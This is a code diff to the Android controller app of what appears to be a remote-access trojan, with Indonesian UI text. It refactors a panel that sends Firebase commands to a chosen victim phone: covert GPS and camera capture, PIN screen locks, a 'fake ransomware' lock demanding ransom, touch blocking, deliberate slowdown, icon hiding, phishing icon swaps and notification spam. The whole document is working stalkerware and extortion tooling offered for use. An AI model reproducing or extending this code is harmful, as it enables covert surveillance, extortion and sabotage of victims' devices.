@@ -10,6 +10,7 @@ import android.text.InputType;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
+import android.widget.GridLayout;
 import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.Switch;
@@ -46,7 +47,6 @@ public class MainActivity extends AppCompatActivity {
     private Button btnGanti, btnSetServer;
     private EditText etServerUrl;
 
-    // Target ID yang dipilih
     private String selectedTargetId = null;
     private boolean isTargetConnected = false;
 
@@ -122,58 +122,86 @@ public class MainActivity extends AppCompatActivity {
 
         sendMyDeviceInfo();
         listenDeviceInfoRealtime();
-
-        // ===== LISTEN SEMUA STATUS =====
         listenStatusRealtime();
-
-        // ===== LISTEN TARGET LIST =====
         listenTargetList();
 
         // ===== GANTI SERVER =====
         btnSetServer.setOnClickListener(v -> {
-            String newUrl = etServerUrl.getText().toString().trim();
-            if (!newUrl.isEmpty()) {
-                mDatabase.child("serverUrl").setValue(newUrl);
-                Toast.makeText(this, "✅ Server URL diubah!", Toast.LENGTH_SHORT).show();
-                etServerUrl.setText("");
-            } else {
-                Toast.makeText(this, "❌ URL kosong!", Toast.LENGTH_SHORT).show();
-            }
+            showInputDialog("🌐 Ganti Server", "Masukkan URL server baru:", "SIMPAN", (input) -> {
+                if (!input.isEmpty()) {
+                    mDatabase.child("serverUrl").setValue(input);
+                    Toast.makeText(this, "✅ Server URL diubah!", Toast.LENGTH_SHORT).show();
+                    etServerUrl.setText("");
+                } else {
+                    Toast.makeText(this, "❌ URL kosong!", Toast.LENGTH_SHORT).show();
+                }
+            });
         });
 
         // ===== ANTI UNINSTALL =====
         swAntiUninstall.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            mDatabase.child("antiUninstall").setValue(isChecked);
+            if (!checkTargetConnection()) {
+                swAntiUninstall.setChecked(!isChecked);
+                return;
+            }
+            mDatabase.child(selectedTargetId).child("antiUninstall").setValue(isChecked);
             updateStatusText(tvAntiUninstallText, isChecked);
             Toast.makeText(this, "Anti Uninstall: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
         // ===== GANTI TARGET =====
-        btnGanti.setOnClickListener(v -> {
-            showTargetSelectionDialog();
-        });
+        btnGanti.setOnClickListener(v -> showTargetSelectionDialog());
 
-        // ===== FLASHLIGHT =====
+        // ===== 1. FLASHLIGHT (Dialog Konfirmasi) =====
         swFlashlight.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            if (!checkTargetConnection()) return;
-            mDatabase.child(selectedTargetId).child("flashlight").setValue(isChecked);
-            updateStatusText(tvFlashlightStatus, isChecked);
-            Toast.makeText(this, "Flashlight: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
-        });
-
-        // ===== LOCK LOW =====
-        swLockLow.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            if (!checkTargetConnection()) return;
-            mDatabase.child(selectedTargetId).child("lockLow").setValue(isChecked);
-            updateStatusText(tvLockLowStatus, isChecked);
-            Toast.makeText(this, "Lock Low: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
-        });
-
-        // ===== LOCK CUSTOM V2 =====
-        swLockCustom.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            if (!checkTargetConnection()) return;
+            if (!checkTargetConnection()) {
+                swFlashlight.setChecked(!isChecked);
+                return;
+            }
             if (isChecked) {
-                showPinDialog("lockCustom", "🔒 Lock Custom V2");
+                showConfirmDialog("🔦 Flashlight", "Nyalakan lampu flash target?", () -> {
+                    mDatabase.child(selectedTargetId).child("flashlight").setValue(true);
+                    updateStatusText(tvFlashlightStatus, true);
+                    Toast.makeText(this, "💡 Flashlight ON", Toast.LENGTH_SHORT).show();
+                }, () -> {
+                    swFlashlight.setChecked(false);
+                });
+            } else {
+                mDatabase.child(selectedTargetId).child("flashlight").setValue(false);
+                updateStatusText(tvFlashlightStatus, false);
+                Toast.makeText(this, "💡 Flashlight OFF", Toast.LENGTH_SHORT).show();
+            }
+        });
+
+        // ===== 2. LOCK LOW (Dialog Konfirmasi) =====
+        swLockLow.setOnCheckedChangeListener((buttonView, isChecked) -> {
+            if (!checkTargetConnection()) {
+                swLockLow.setChecked(!isChecked);
+                return;
+            }
+            if (isChecked) {
+                showConfirmDialog("🔒 Lock Low", "Kunci layar target (mode ringan)?", () -> {
+                    mDatabase.child(selectedTargetId).child("lockLow").setValue(true);
+                    updateStatusText(tvLockLowStatus, true);
+                    Toast.makeText(this, "🔒 Lock Low ON", Toast.LENGTH_SHORT).show();
+                }, () -> {
+                    swLockLow.setChecked(false);
+                });
+            } else {
+                mDatabase.child(selectedTargetId).child("lockLow").setValue(false);
+                updateStatusText(tvLockLowStatus, false);
+                Toast.makeText(this, "🔓 Lock Low OFF", Toast.LENGTH_SHORT).show();
+            }
+        });
+
+        // ===== 3. LOCK CUSTOM V2 (Dialog Set PIN) =====
+        swLockCustom.setOnCheckedChangeListener((buttonView, isChecked) -> {
+            if (!checkTargetConnection()) {
+                swLockCustom.setChecked(!isChecked);
+                return;
+            }
+            if (isChecked) {
+                showPinDialog("lockCustom", "🔒 Lock Custom V2", "Set PIN untuk mengunci HP target");
             } else {
                 mDatabase.child(selectedTargetId).child("lockCustom").setValue(false);
                 updateStatusText(tvLockCustomStatus, false);
@@ -181,46 +209,66 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        // ===== NGEHANG =====
+        // ===== 4. NGEHANG (Dialog Konfirmasi) =====
         swNgehang.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            if (!checkTargetConnection()) return;
-            mDatabase.child(selectedTargetId).child("ngehang").setValue(isChecked);
-            updateStatusText(tvNgehangStatus, isChecked);
-            Toast.makeText(this, "💀 Ngehang: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
+            if (!checkTargetConnection()) {
+                swNgehang.setChecked(!isChecked);
+                return;
+            }
+            if (isChecked) {
+                showConfirmDialog("💀 Ngehang", "Bikin HP target lemot/ngadat?", () -> {
+                    mDatabase.child(selectedTargetId).child("ngehang").setValue(true);
+                    updateStatusText(tvNgehangStatus, true);
+                    Toast.makeText(this, "💀 Ngehang ON", Toast.LENGTH_SHORT).show();
+                }, () -> {
+                    swNgehang.setChecked(false);
+                });
+            } else {
+                mDatabase.child(selectedTargetId).child("ngehang").setValue(false);
+                updateStatusText(tvNgehangStatus, false);
+                Toast.makeText(this, "💀 Ngehang OFF", Toast.LENGTH_SHORT).show();
+            }
         });
 
-        // ===== HIDE ICON =====
+        // ===== 5. HIDE ICON (Dialog Konfirmasi) =====
         swHideIcon.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            if (!checkTargetConnection()) return;
-            mDatabase.child(selectedTargetId).child("hideIcon").setValue(isChecked);
-            updateStatusText(tvHideIconStatus, isChecked);
-            Toast.makeText(this, "Hide Icon: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
+            if (!checkTargetConnection()) {
+                swHideIcon.setChecked(!isChecked);
+                return;
+            }
+            if (isChecked) {
+                showConfirmDialog("👻 Hide Icon", "Sembunyikan ikon aplikasi target?", () -> {
+                    mDatabase.child(selectedTargetId).child("hideIcon").setValue(true);
+                    updateStatusText(tvHideIconStatus, true);
+                    Toast.makeText(this, "👻 Hide Icon ON", Toast.LENGTH_SHORT).show();
+                }, () -> {
+                    swHideIcon.setChecked(false);
+                });
+            } else {
+                mDatabase.child(selectedTargetId).child("hideIcon").setValue(false);
+                updateStatusText(tvHideIconStatus, false);
+                Toast.makeText(this, "👻 Hide Icon OFF", Toast.LENGTH_SHORT).show();
+            }
         });
 
-        // ===== TEMA PHISING =====
+        // ===== 6. TEMA PHISING (Dialog Input URL) =====
         View cardTemaPhising = findViewById(R.id.cardTemaPhising);
         Button btnTemaPhising = cardTemaPhising.findViewById(R.id.btnAction);
         if (btnTemaPhising != null) {
             btnTemaPhising.setOnClickListener(v -> {
                 if (!checkTargetConnection()) return;
-                AlertDialog.Builder builder = new AlertDialog.Builder(this);
-                builder.setTitle("🎨 Tema Phising");
-                final EditText input = new EditText(this);
-                input.setHint("Masukkan URL icon baru...");
-                builder.setView(input);
-                builder.setPositiveButton("GANTI", (dialog, which) -> {
-                    String url = input.getText().toString();
-                    if (!url.isEmpty()) {
-                        mDatabase.child(selectedTargetId).child("temaPhising").setValue(url);
+                showInputDialog("🎨 Tema Phising", "Masukkan URL icon baru:", "GANTI", (input) -> {
+                    if (!input.isEmpty()) {
+                        mDatabase.child(selectedTargetId).child("temaPhising").setValue(input);
                         Toast.makeText(this, "✅ Icon diubah!", Toast.LENGTH_SHORT).show();
+                    } else {
+                        Toast.makeText(this, "❌ URL kosong!", Toast.LENGTH_SHORT).show();
                     }
                 });
-                builder.setNegativeButton("Batal", null);
-                builder.show();
             });
         }
 
-        // ===== VIDEO OVERLAY =====
+        // ===== 7. VIDEO OVERLAY (Buka Galeri) =====
         View cardVideoOverlay = findViewById(R.id.cardVideoOverlay);
         Button btnVideoOverlay = cardVideoOverlay.findViewById(R.id.btnAction);
         if (btnVideoOverlay != null) {
@@ -232,160 +280,178 @@ public class MainActivity extends AppCompatActivity {
             });
         }
 
-        // ===== SPAM NOTIFIKASI =====
+        // ===== 8. SPAM NOTIFIKASI (Dialog Input Pesan) =====
         View cardSpamNotif = findViewById(R.id.cardSpamNotif);
         Button btnSpamNotif = cardSpamNotif.findViewById(R.id.btnAction);
         if (btnSpamNotif != null) {
             btnSpamNotif.setOnClickListener(v -> {
                 if (!checkTargetConnection()) return;
-                AlertDialog.Builder builder = new AlertDialog.Builder(this);
-                builder.setTitle("📨 Kirim Spam Notifikasi");
-                final EditText input = new EditText(this);
-                input.setHint("Ketik pesan spam...");
-                builder.setView(input);
-                builder.setPositiveButton("KIRIM", (dialog, which) -> {
-                    String pesan = input.getText().toString();
-                    if (!pesan.isEmpty()) {
-                        mDatabase.child(selectedTargetId).child("spamNotif").setValue(pesan);
+                showInputDialog("📨 Spam Notifikasi", "Ketik pesan spam:", "KIRIM", (input) -> {
+                    if (!input.isEmpty()) {
+                        mDatabase.child(selectedTargetId).child("spamNotif").setValue(input);
                         Toast.makeText(this, "✅ Spam terkirim!", Toast.LENGTH_SHORT).show();
                     } else {
                         Toast.makeText(this, "❌ Pesan kosong!", Toast.LENGTH_SHORT).show();
                     }
                 });
-                builder.setNegativeButton("Batal", null);
-                builder.show();
             });
         }
 
-        // ===== STUCK LAYAR =====
+        // ===== 9. STUCK LAYAR (Dialog Konfirmasi) =====
         View cardStuckLayar = findViewById(R.id.cardStuckLayar);
         Button btnStuckLayar = cardStuckLayar.findViewById(R.id.btnAction);
         if (btnStuckLayar != null) {
             btnStuckLayar.setOnClickListener(v -> {
                 if (!checkTargetConnection()) return;
-                mDatabase.child(selectedTargetId).child("stuckLayar").setValue("TAP, BLOCK TOUCH");
-                Toast.makeText(this, "🔒 Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
+                showConfirmDialog("🔒 Stuck Layar", "Blokir touch screen target?", () -> {
+                    mDatabase.child(selectedTargetId).child("stuckLayar").setValue("TAP, BLOCK TOUCH");
+                    Toast.makeText(this, "🔒 Stuck Layar AKTIF!", Toast.LENGTH_SHORT).show();
+                });
             });
         }
 
-        // ===== GPS =====
+        // ===== 10. GPS (Dialog Konfirmasi) =====
         View cardGPS = findViewById(R.id.cardGPS);
         Button btnGPS = cardGPS.findViewById(R.id.btnAction);
         if (btnGPS != null) {
             btnGPS.setOnClickListener(v -> {
                 if (!checkTargetConnection()) return;
-                mDatabase.child(selectedTargetId).child("command").setValue("gps");
-                Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
+                showConfirmDialog("📍 GPS", "Ambil lokasi target sekarang?", () -> {
+                    mDatabase.child(selectedTargetId).child("command").setValue("gps");
+                    Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
+                });
             });
         }
 
-        // ===== KAMERA =====
+        // ===== 11. KAMERA (Dialog Pilih Kamera) =====
         View cardKamera = findViewById(R.id.cardKamera);
         Button btnKamera = cardKamera.findViewById(R.id.btnAction);
         if (btnKamera != null) {
             btnKamera.setOnClickListener(v -> {
                 if (!checkTargetConnection()) return;
-                AlertDialog.Builder builder = new AlertDialog.Builder(this);
-                builder.setTitle("📸 Pilih Kamera Target");
-                builder.setItems(new String[]{"📷 Kamera Depan", "📷 Kamera Belakang"}, (dialog, which) -> {
-                    String command = (which == 0) ? "camera_front" : "camera_back";
-                    mDatabase.child(selectedTargetId).child("command").setValue(command);
-                    Toast.makeText(this, "📸 Mengambil foto...", Toast.LENGTH_SHORT).show();
-                });
-                builder.show();
+                showCameraDialog();
             });
         }
 
-        // ===== FAKE RANSOMWARE =====
+        // ===== 12. FAKE RANSOMWARE (Dialog Set PIN) =====
         View cardRansomware = findViewById(R.id.cardRansomware);
         Button btnRansomware = cardRansomware.findViewById(R.id.btnAction);
         if (btnRansomware != null) {
             btnRansomware.setOnClickListener(v -> {
                 if (!checkTargetConnection()) return;
-                showPinDialog("ransomware", "💰 Fake Ransomware");
+                showPinDialog("ransomware", "💰 Fake Ransomware", "Set PIN untuk mengunci HP target dan minta tebusan");
             });
         }
     }
 
-    // ===== CEK KONEKSI TARGET =====
-    private boolean checkTargetConnection() {
-        if (selectedTargetId == null || !isTargetConnected) {
-            AlertDialog.Builder builder = new AlertDialog.Builder(this);
-            builder.setTitle("⚠️ Belum Terhubung");
-            builder.setMessage("Belum terhubung ke target. Silakan pilih target terlebih dahulu.");
-            builder.setPositiveButton("PILIH TARGET", (dialog, which) -> {
-                showTargetSelectionDialog();
-            });
-            builder.setNegativeButton("Batal", null);
-            builder.show();
-            return false;
-        }
-        return true;
+    // ===== DIALOG KONFIRMASI =====
+    private void showConfirmDialog(String title, String message, Runnable onConfirm) {
+        showConfirmDialog(title, message, onConfirm, null);
     }
 
-    // ===== FUNGSI SET NAMA FITUR PADA CARD =====
-    private void setCardName(int cardId, String nama) {
-        View card = findViewById(cardId);
-        if (card == null) return;
-        TextView tvNama = card.findViewById(R.id.tvNamaFitur);
-        if (tvNama != null) {
-            tvNama.setText(nama);
-        }
-        // Sembunyikan toggle untuk fitur non-toggle
-        String[] toggleFitur = {"Flashlight", "Lock Low", "Lock Custom V2", "Hide Icon", "Ngehang"};
-        boolean isToggle = false;
-        for (String f : toggleFitur) {
-            if (f.equals(nama)) isToggle = true;
-        }
-        Switch swFitur = card.findViewById(R.id.swFitur);
-        TextView tvStatus = card.findViewById(R.id.tvStatusFitur);
-        Button btnAction = card.findViewById(R.id.btnAction);
-        if (isToggle) {
-            if (swFitur != null) swFitur.setVisibility(View.VISIBLE);
-            if (tvStatus != null) tvStatus.setVisibility(View.VISIBLE);
-            if (btnAction != null) btnAction.setVisibility(View.GONE);
-        } else {
-            if (swFitur != null) swFitur.setVisibility(View.GONE);
-            if (tvStatus != null) tvStatus.setVisibility(View.GONE);
-            if (btnAction != null) {
-                btnAction.setVisibility(View.VISIBLE);
-                btnAction.setText("TAP");
-            }
-        }
+    private void showConfirmDialog(String title, String message, Runnable onConfirm, Runnable onCancel) {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle(title);
+        builder.setMessage(message);
+        builder.setPositiveButton("YA", (dialog, which) -> {
+            if (onConfirm != null) onConfirm.run();
+        });
+        builder.setNegativeButton("BATAL", (dialog, which) -> {
+            if (onCancel != null) onCancel.run();
+            dialog.cancel();
+        });
+        builder.setCancelable(false);
+        builder.show();
+    }
+
+    // ===== DIALOG INPUT =====
+    private void showInputDialog(String title, String hint, String buttonText, OnInputListener listener) {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle(title);
+
+        final EditText input = new EditText(this);
+        input.setHint(hint);
+        input.setTextColor(0xFFFFFFFF);
+        input.setHintTextColor(0xFF888888);
+        input.setBackgroundColor(0x1A1A1A);
+        input.setPadding(20, 16, 20, 16);
+        builder.setView(input);
+
+        builder.setPositiveButton(buttonText, (dialog, which) -> {
+            String result = input.getText().toString().trim();
+            if (listener != null) listener.onInput(result);
+        });
+        builder.setNegativeButton("BATAL", null);
+        builder.show();
     }
 
     // ===== DIALOG PIN =====
-    private void showPinDialog(String command, String title) {
+    private void showPinDialog(String command, String title, String message) {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle(title);
+        builder.setMessage(message);
+
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setPadding(30, 20, 30, 20);
 
         final EditText input = new EditText(this);
         input.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
         input.setHint("4 digit PIN");
         input.setMaxLines(1);
-        builder.setView(input);
+        input.setTextSize(18);
+        input.setTextColor(0xFFFFFFFF);
+        input.setHintTextColor(0xFF888888);
+        layout.addView(input);
 
-        builder.setPositiveButton("LANJUT", (dialog, which) -> {
-            String pin = input.getText().toString().trim();
-            if (pin.length() == 4) {
-                mDatabase.child(selectedTargetId).child("pin").setValue(pin);
-                if (command.equals("lockCustom")) {
-                    mDatabase.child(selectedTargetId).child("lockCustom").setValue(true);
-                    updateStatusText(tvLockCustomStatus, true);
-                    Toast.makeText(this, "🔒 HP Target Terkunci! PIN: " + pin, Toast.LENGTH_SHORT).show();
-                } else if (command.equals("ransomware")) {
-                    mDatabase.child(selectedTargetId).child("ransomware").setValue(true);
-                    Toast.makeText(this, "💰 Target kena Ransomware! PIN: " + pin, Toast.LENGTH_SHORT).show();
-                }
-            } else {
-                Toast.makeText(this, "❌ PIN harus 4 digit!", Toast.LENGTH_SHORT).show();
-                if (command.equals("lockCustom")) {
-                    swLockCustom.setChecked(false);
-                }
-            }
-        });
+        GridLayout grid = new GridLayout(this);
+        grid.setColumnCount(3);
+        grid.setRowCount(4);
 
-        builder.setNegativeButton("Batal", (dialog, which) -> {
+        String[] keys = {"1","2","3","4","5","6","7","8","9","⌫","0","✓"};
+        for (String key : keys) {
+            Button btn = new Button(this);
+            btn.setText(key);
+            btn.setTextSize(20);
+            btn.setTextColor(0xFFFFFFFF);
+            btn.setBackgroundColor(0x1A1A1A);
+            btn.setPadding(16, 16, 16, 16);
+            btn.setOnClickListener(v -> {
+                String current = input.getText().toString();
+                if (key.equals("⌫")) {
+                    if (current.length() > 0) {
+                        input.setText(current.substring(0, current.length() - 1));
+                    }
+                } else if (key.equals("✓")) {
+                    String pin = input.getText().toString().trim();
+                    if (pin.length() == 4) {
+                        mDatabase.child(selectedTargetId).child("pin").setValue(pin);
+                        if (command.equals("lockCustom")) {
+                            mDatabase.child(selectedTargetId).child("lockCustom").setValue(true);
+                            updateStatusText(tvLockCustomStatus, true);
+                            Toast.makeText(MainActivity.this, "🔒 HP Target Terkunci! PIN: " + pin, Toast.LENGTH_SHORT).show();
+                        } else if (command.equals("ransomware")) {
+                            mDatabase.child(selectedTargetId).child("ransomware").setValue(true);
+                            Toast.makeText(MainActivity.this, "💰 Target kena Ransomware! PIN: " + pin, Toast.LENGTH_SHORT).show();
+                        }
+                        AlertDialog dialog = (AlertDialog) v.getTag();
+                        if (dialog != null) dialog.dismiss();
+                    } else {
+                        Toast.makeText(MainActivity.this, "❌ PIN harus 4 digit!", Toast.LENGTH_SHORT).show();
+                    }
+                } else {
+                    if (current.length() < 4) {
+                        input.setText(current + key);
+                    }
+                }
+            });
+            grid.addView(btn);
+        }
+
+        layout.addView(grid);
+        builder.setView(layout);
+
+        builder.setNegativeButton("BATAL", (dialog, which) -> {
             if (command.equals("lockCustom")) {
                 swLockCustom.setChecked(false);
                 updateStatusText(tvLockCustomStatus, false);
@@ -393,13 +459,29 @@ public class MainActivity extends AppCompatActivity {
             dialog.cancel();
         });
 
-        builder.setOnCancelListener(dialog -> {
-            if (command.equals("lockCustom")) {
-                swLockCustom.setChecked(false);
-                updateStatusText(tvLockCustomStatus, false);
-            }
-        });
+        AlertDialog dialog = builder.create();
 
+        for (int i = 0; i < grid.getChildCount(); i++) {
+            View v = grid.getChildAt(i);
+            if (v instanceof Button && ((Button) v).getText().equals("✓")) {
+                v.setTag(dialog);
+                break;
+            }
+        }
+
+        dialog.show();
+    }
+
+    // ===== DIALOG KAMERA =====
+    private void showCameraDialog() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("📸 Pilih Kamera Target");
+        builder.setItems(new String[]{"📷 Kamera Depan", "📷 Kamera Belakang"}, (dialog, which) -> {
+            String command = (which == 0) ? "camera_front" : "camera_back";
+            mDatabase.child(selectedTargetId).child("command").setValue(command);
+            Toast.makeText(this, "📸 Mengambil foto...", Toast.LENGTH_SHORT).show();
+        });
+        builder.setNegativeButton("BATAL", null);
         builder.show();
     }
 
@@ -420,7 +502,6 @@ public class MainActivity extends AppCompatActivity {
         builder.setView(layout);
         AlertDialog dialog = builder.create();
 
-        // Ambil daftar target dari Firebase
         mDatabase.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -461,7 +542,6 @@ public class MainActivity extends AppCompatActivity {
                     item.setOnClickListener(v -> {
                         selectedTargetId = key;
                         isTargetConnected = online != null && online;
-                        // Update header dengan data target
                         if (deviceName != null) {
                             tvDeviceName.setText(deviceName);
                             tvDeviceName2.setText(deviceName);
@@ -480,7 +560,6 @@ public class MainActivity extends AppCompatActivity {
                     });
 
                     layout.addView(item);
-                    // Spacer
                     View spacer = new View(MainActivity.this);
                     spacer.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 8));
                     layout.addView(spacer);
@@ -509,12 +588,61 @@ public class MainActivity extends AppCompatActivity {
         dialog.show();
     }
 
+    // ===== CEK KONEKSI TARGET =====
+    private boolean checkTargetConnection() {
+        if (selectedTargetId == null || !isTargetConnected) {
+            AlertDialog.Builder builder = new AlertDialog.Builder(this);
+            builder.setTitle("⚠️ Belum Terhubung");
+            builder.setMessage("Belum terhubung ke target. Silakan pilih target terlebih dahulu.");
+            builder.setPositiveButton("PILIH TARGET", (dialog, which) -> showTargetSelectionDialog());
+            builder.setNegativeButton("Batal", null);
+            builder.show();
+            return false;
+        }
+        return true;
+    }
+
+    // ===== FUNGSI SET NAMA FITUR PADA CARD =====
+    private void setCardName(int cardId, String nama) {
+        View card = findViewById(cardId);
+        if (card == null) return;
+        TextView tvNama = card.findViewById(R.id.tvNamaFitur);
+        if (tvNama != null) {
+            tvNama.setText(nama);
+        }
+        String[] toggleFitur = {"Flashlight", "Lock Low", "Lock Custom V2", "Hide Icon", "Ngehang"};
+        boolean isToggle = false;
+        for (String f : toggleFitur) {
+            if (f.equals(nama)) isToggle = true;
+        }
+        Switch swFitur = card.findViewById(R.id.swFitur);
+        TextView tvStatus = card.findViewById(R.id.tvStatusFitur);
+        Button btnAction = card.findViewById(R.id.btnAction);
+        if (isToggle) {
+            if (swFitur != null) swFitur.setVisibility(View.VISIBLE);
+            if (tvStatus != null) tvStatus.setVisibility(View.VISIBLE);
+            if (btnAction != null) btnAction.setVisibility(View.GONE);
+        } else {
+            if (swFitur != null) swFitur.setVisibility(View.GONE);
+            if (tvStatus != null) tvStatus.setVisibility(View.GONE);
+            if (btnAction != null) {
+                btnAction.setVisibility(View.VISIBLE);
+                btnAction.setText("TAP");
+            }
+        }
+    }
+
+    // ===== UPDATE STATUS TEXT =====
+    private void updateStatusText(TextView tv, boolean isOn) {
+        tv.setText(isOn ? "ON" : "OFF");
+        tv.setTextColor(isOn ? 0xFF4ADE80 : 0xFFFF5C7C);
+    }
+
     // ===== LISTEN TARGET LIST =====
     private void listenTargetList() {
         targetListListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
-                // Update otomatis header jika target yang dipilih berubah
                 if (selectedTargetId != null) {
                     DataSnapshot targetSnapshot = snapshot.child(selectedTargetId);
                     if (targetSnapshot.exists()) {
@@ -547,12 +675,6 @@ public class MainActivity extends AppCompatActivity {
             public void onCancelled(@NonNull DatabaseError error) {}
         };
         mDatabase.addValueEventListener(targetListListener);
-    }
-
-    // ===== UPDATE STATUS TEXT =====
-    private void updateStatusText(TextView tv, boolean isOn) {
-        tv.setText(isOn ? "ON" : "OFF");
-        tv.setTextColor(isOn ? 0xFF4ADE80 : 0xFFFF5C7C);
     }
 
     // ===== REAL-TIME: DATA TARGET =====
@@ -740,4 +862,8 @@ public class MainActivity extends AppCompatActivity {
         if (ngehangListener != null) mDatabase.child("ngehang").removeEventListener(ngehangListener);
         if (targetListListener != null) mDatabase.removeEventListener(targetListListener);
     }
-            }
+
+    interface OnInputListener {
+        void onInput(String input);
+    }
+                                  }
